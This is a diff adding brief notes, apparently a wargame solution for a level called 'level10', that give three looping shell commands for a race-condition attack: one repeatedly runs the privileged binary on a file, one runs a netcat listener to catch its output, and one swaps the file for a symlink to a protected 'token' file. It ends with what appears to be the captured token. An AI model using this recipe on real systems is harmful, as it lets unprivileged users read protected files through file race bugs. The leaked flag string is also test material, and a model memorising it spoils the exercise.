@@ -1,0 +1,9 @@
+3 terminals :
+
+while true; do rm exploit; echo "not yet" > exploit; chmod 777 exploit; ./level10 exploit 10.12.1.133; done
+
+while true; do nc -l 6969 ; done
+
+while true; do rm exploit; ln -s token exploit ; done
+
+woupa2yuojeeaaed06riuj63c
